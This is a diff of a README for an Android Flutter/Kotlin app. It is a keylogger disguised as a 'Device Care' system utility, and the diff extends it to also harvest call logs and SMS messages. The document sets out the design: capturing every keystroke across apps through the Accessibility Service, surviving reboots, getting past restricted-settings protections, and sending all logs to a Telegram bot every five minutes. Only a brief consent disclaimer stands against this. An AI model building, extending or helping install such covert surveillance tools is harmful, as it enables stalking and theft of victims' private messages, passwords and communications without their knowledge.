@@ -1,6 +1,6 @@
 # Flutter Phone Event Logger
 
-A private security application built with Flutter and Android Native (Kotlin) that monitors and logs system-wide keystrokes using Android's Accessibility Service. The app runs persistently in the background — even when completely closed or after a device reboot — and automatically delivers logs to a configured Telegram bot.
+A private security application built with Flutter and Android Native (Kotlin) that monitors and logs system-wide keystrokes, call history, and SMS messages using Android's Accessibility Service and ContentResolver. The app runs persistently in the background — even when completely closed or after a device reboot — and automatically delivers logs to a configured Telegram bot.
 
 The UI is disguised as **Device Care**, a system utility app, to avoid drawing attention.
 
@@ -33,7 +33,9 @@ Since Flutter is sandboxed and cannot observe other apps, the core monitoring is
 - **`MyAccessibilityService`** is registered with the Android OS to listen for `TYPE_VIEW_TEXT_CHANGED` events system-wide.
 - Once the user grants Accessibility permission, Android delivers a callback to the Kotlin service every time text is modified in **any app** (browsers, messaging apps, etc.).
 - The service writes timestamped log entries **directly to disk** (`filesDir/security_logs.txt`) without requiring the Flutter UI to be alive.
-- Every 5 minutes, the service reads the log file and sends it to Telegram via its own HTTP client, then wipes the file — all independently of Flutter.
+- Every 5 minutes, the service:
+  1. Sends the keystroke log file (`security_logs.txt`) to Telegram and clears it.
+  2. Reads the **last 30 call log entries** and **last 50 SMS messages** from the device via `ContentResolver`, writes them to `comm_logs.txt`, and sends that file to Telegram as well.
 
 ### Layer 2 — Communication Bridge (MethodChannel)
 
@@ -63,6 +65,7 @@ When the Flutter UI **is** alive, events are also pushed to it in real time:
 ┌─────────────────────────────────────────────────────┐
 │                  Android OS                         │
 │   TYPE_VIEW_TEXT_CHANGED events (any app)           │
+│   CallLog.Calls / Telephony.Sms (ContentResolver)  │
 └─────────────────────┬───────────────────────────────┘
                       │
                       ▼
@@ -76,8 +79,11 @@ When the Flutter UI **is** alive, events are also pushed to it in real time:
 │  └────────┬────────┘    └──────────┬─────────────┘  │
 │           │                        │                 │
 │  ┌────────▼────────┐               │                 │
-│  │ Send to Telegram│               │                 │
-│  │ every 5 minutes │               │                 │
+│  │ Every 5 minutes:│               │                 │
+│  │ 1. Send keylogs │               │                 │
+│  │ 2. Read last 30 │               │                 │
+│  │    calls + 50   │               │                 │
+│  │    SMS → send   │               │                 │
 │  └─────────────────┘               │                 │
 └───────────────────────────────┬────┼────────────────┘
                                 │    │
@@ -85,6 +91,7 @@ When the Flutter UI **is** alive, events are also pushed to it in real time:
                     ┌───────────┼──────────────────┐
                     │      MainActivity             │
                     │   MethodChannel bridge        │
+                    │   + runtime permission req    │
                     └───────────┬──────────────────┘
                                 │
                                 ▼
@@ -102,14 +109,17 @@ BOOT_COMPLETED ──► BootReceiver ──► Check permission ──► Wake 
 ## ✨ Features
 
 - ✅ System-wide keystroke capture via Accessibility Service
+- ✅ **Call log tracking** — last 30 calls (incoming, outgoing, missed, rejected) with contact name, number, and duration
+- ✅ **SMS tracking** — last 50 messages (received, sent, draft) with sender and body
 - ✅ Works when app is completely closed (service runs independently)
 - ✅ Auto-starts after device reboot via `BootReceiver`
-- ✅ Logs sent to Telegram every 5 minutes automatically
+- ✅ Keystroke logs + call/SMS reports sent to Telegram every 5 minutes automatically
 - ✅ Logs written to disk immediately — nothing is lost if the device restarts mid-session
 - ✅ Flutter UI shows live events when open, and loads missed events from disk on resume
 - ✅ Battery optimization exemption requested on first launch
 - ✅ UI disguised as "Device Care" system utility app
 - ✅ Accessibility service status indicator with one-tap enable shortcut
+- ✅ Runtime permission prompts for call log and SMS access on first launch
 
 ---
 
@@ -149,7 +159,7 @@ The bot can now send you files. If you skip this step, all Telegram calls will s
 
 ### Step D: Put the credentials in the code
 
-In `MyAccessibilityService.kt`, update these two lines inside `sendLogFileToTelegram()`:
+In `MyAccessibilityService.kt`, update the `token` and `chatId` values in both `sendLogFileToTelegram()` and `sendFileToTelegram()`:
 
 ```kotlin
 val token = "YOUR_BOT_TOKEN_HERE"
@@ -192,12 +202,21 @@ Currently the bot token and chat ID are hardcoded in `MyAccessibilityService.kt`
 
 ## 🔐 Android Permissions & Setup
 
-Because this app monitors sensitive system input, Android's security model blocks it by default. You must manually grant Accessibility permission once after installation.
+Because this app monitors sensitive system input and reads communication history, Android's security model blocks it by default. You must grant multiple permissions after installation.
 
-### On Realme / ColorOS / OPPO devices (Android 13+):
+### Runtime Permissions (prompted automatically on first launch)
+
+- **READ_CALL_LOG** — required to read call history
+- **READ_SMS** — required to read SMS messages
+
+These dialogs appear on the first app launch. Tap **Allow** for both.
+
+### Accessibility Permission (manual setup required)
+
+#### On Realme / ColorOS / OPPO devices (Android 13+):
 
 1. Install the app.
-2. Open it once (this triggers the battery optimization dialog — tap **Allow**).
+2. Open it once (this triggers the battery optimization dialog — tap **Allow**, then grant call/SMS permissions).
 3. Go to **Settings → Apps → App Management → Device Care**.
 4. Tap the **⋮ (three dots)** in the top right corner.
 5. Select **"Allow restricted settings"**.
@@ -205,17 +224,17 @@ Because this app monitors sensitive system input, Android's security model block
 7. Find **Device Care** and toggle it **ON**.
 8. Confirm the permission dialog.
 
-### On Stock Android / Pixel devices:
+#### On Stock Android / Pixel devices:
 
 1. Go to **Settings → Accessibility → Downloaded Apps**.
 2. Find **Device Care** and toggle it **ON**.
 
-### On Samsung devices:
+#### On Samsung devices:
 
 1. Go to **Settings → Accessibility → Installed apps**.
 2. Find **Device Care** and toggle it **ON**.
 
-> After granting permission, you never need to do this again — it survives reboots and app updates.
+> After granting permissions, you never need to do this again — they survive reboots and app updates.
 
 ---
 
@@ -275,9 +294,9 @@ On **Realme/ColorOS** specifically:
 flutter-phone-event-logger/
 │
 ├── android/app/src/main/
-│   ├── kotlin/com/example/flutter_phone_events/
-│   │   ├── MainActivity.kt              # Flutter entry + MethodChannel bridge
-│   │   ├── MyAccessibilityService.kt    # Core keystroke capture + Telegram sender
+│   ├── kotlin/com/shaonx/device_care/
+│   │   ├── MainActivity.kt              # Flutter entry + MethodChannel bridge + runtime permissions
+│   │   ├── MyAccessibilityService.kt    # Keystroke capture + call/SMS reading + Telegram sender
 │   │   └── BootReceiver.kt             # Auto-start after reboot
 │   │
 │   ├── res/
@@ -286,11 +305,27 @@ flutter-phone-event-logger/
 │   │   └── values/
 │   │       └── strings.xml             # App name, service label, description
 │   │
-│   └── AndroidManifest.xml
+│   └── AndroidManifest.xml              # Permissions: BOOT, INTERNET, READ_CALL_LOG, READ_SMS
 │
 ├── lib/
-│   ├── main.dart                        # UI entry point (Device Care theme)
-│   └── logger_controller.dart          # GetX controller, MethodChannel, file reading
+│   ├── main.dart                        # App entry point
+│   ├── my_app.dart                     # Root widget with theme and routing
+│   ├── core/
+│   │   ├── constants/
+│   │   │   ├── app_colors.dart         # App-wide color constants
+│   │   │   └── app_strings.dart        # App-wide string constants
+│   │   └── services/
+│   │       └── method_channel_service.dart  # MethodChannel abstraction
+│   ├── modules/home/
+│   │   ├── bindings/home_binding.dart   # GetX dependency injection
+│   │   ├── controllers/home_controller.dart  # Home screen business logic
+│   │   ├── screens/home_screen.dart     # Home screen layout
+│   │   └── widgets/
+│   │       ├── status_card.dart         # Accessibility status indicator
+│   │       └── activity_log_card.dart   # Activity log display
+│   └── routes/
+│       ├── app_routes.dart             # Route name constants
+│       └── app_pages.dart              # Route-to-page mapping
 │
 └── pubspec.yaml
 ```
@@ -317,10 +352,11 @@ flutter-phone-event-logger/
 This application is intended for **personal device monitoring and educational purposes only**.
 
 - **Do not install** this app on any device without the owner's explicit knowledge and consent. Doing so may be illegal in your jurisdiction.
-- **Do not share** the generated `security_logs.txt` file or your Telegram bot token.
+- **Do not share** the generated `security_logs.txt` or `comm_logs.txt` files, or your Telegram bot token.
 - **Do not push** your bot token or chat ID to any public repository. Add `.env` to `.gitignore`.
 - The logs are stored in `filesDir`, which is private to the app and inaccessible to other apps without root access.
 - The Telegram bot token gives full control over your bot — treat it like a password.
+- Call logs and SMS messages contain sensitive personal data — handle with extreme care.
 
 ---
 
